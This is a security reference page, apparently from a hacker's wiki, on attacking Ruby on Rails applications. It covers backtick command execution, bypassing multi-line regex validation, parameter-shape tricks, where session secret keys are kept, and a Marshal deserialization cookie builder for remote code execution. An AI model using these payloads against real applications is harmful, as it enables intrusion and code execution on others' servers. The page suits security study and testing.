---
description: A common web framework for the Ruby Programming Language
---

# Ruby on Rails

{% hint style="info" %}
**Note**: A lot of content here is taken from [this gist](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe) talking about Ruby on Rails applications. Be sure to check it out for a lot of attack techniques
{% endhint %}

## RCE

In Ruby, if you can execute any code a simple `` ` `` will allow you to execute system commands:

```ruby
`touch a`  # Runs command without output (reverse shell)
puts `id`  # Prints output
```

## Regular Expressions

In ruby you can match a string to some regex in two simple ways:

```ruby
a="some text containing abbbbc to match"

if a =~ /ab+c/
    puts "match"
end

if a.match(/ab+c/)
    puts "match"
end
```

These two ways are identical to eachother, but not the same as many other programming languages. The change is that **Regular Expressions are multi-line by default**. In some languages this is represented as another argument, or `/m` at the end, but in Ruby this is the default.&#x20;

The multi-line mode makes `^` and `$` act differently. Normally, these would represent the start and end of the **whole string**. But in multi-line mode these are the start and end of the **line**. This means that if there are newlines characters in the string, the `^` for example could match against a line earlier or later in the string.&#x20;

Many regular expressions use these characters to sanitize user input, and to tries to if the whole string follows a certain pattern. But in Ruby, if you can get a newline into the string, any of the lines just needs to match. So one line can follow the pattern, but another line can be some arbitrary payload that gets past the check.&#x20;

Here's an example:

```ruby
a="foo\nbar"

if a =~ /^foo$/  # Tries to match only "foo"
    puts "match"  # "bar" gets injected
end
```

Also see the whole chapter on [regular-expressions-regex.md](../../languages/regular-expressions-regex.md "mention") for more details on the syntax.&#x20;

## URL Parameters

Similarly to [php.md](../../languages/php.md "mention"), Ruby on Rails allows you to put arrays in query parameters:

```url
?user[]=first&user[]=second
```

This will result in a `params` variable like this:

```ruby
{"user" => ["first","second"]}
```

You can even use named array keys to create objects inside:

```url
?user[name]=hacker&user[password]=hunter2
```

```ruby
{"user" => {"name" => "hacker", "password" => "hunter2"}}
```

Finally, you can create `nil` values by not providing a value, which might break some things:

```
?user[name]
```

```ruby
{"user" => {"name" => nil}}
```

See [1.1.2 - Multiparameter attributes](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L165) and [1.1.3 - POST/PUT text/xml](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L188) for more input tricks like these.&#x20;

## Sessions

If you can find the Secret Key used for verifying sessions, you can do a lot. Some common locations are:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ` (if it's just given via an ENV variable)

### Forging sessions

First of all, you can of course sign your own data to create arbitrary objects that might bypass authentication or anything else. See [this code](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L374-L414) as an example to serialize your own data.&#x20;

### Insecure Deserialization

Ruby on Rails cookies use Marshal serialization to turn objects into strings, and then back into objects for deserialization.&#x20;

For Ruby 3 you can use a piece of code like this to create a marshal payload executing any Ruby code:

```ruby
 def build_cookie
    code = "eval('whatever ruby code')"
    marshal_payload = Rex::Text.encode_base64(
      "\x04\x08" +
      "o" +
      ":\x40ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy" +
      "\x07" +
              ":\x0E@instance" +
                      "o" + ":\x08ERB" + "\x06" +
                              ":\x09@src" +
                                      Marshal.dump(code)[2..-1] +
              ":\x0C@method" + ":\x0Bresult"
    ).chomp
    digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::Digest.new("SHA1"),
      SECRET_TOKEN, marshal_payload)
    marshal_payload = Rex::Text.uri_encode(marshal_payload)
    "#{marshal_payload}--#{digest}"
  end
```

**More References**

* [2.1 - Sessions](https://gist.github.com/cyberheartmi9/7fe85b61621f4126462d2125c4b19dfe#file-attacking-ruby-on-rails-applications-L374-L414)
* [PayloadsAllTheThings/Ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md)
* [YAML example](https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)
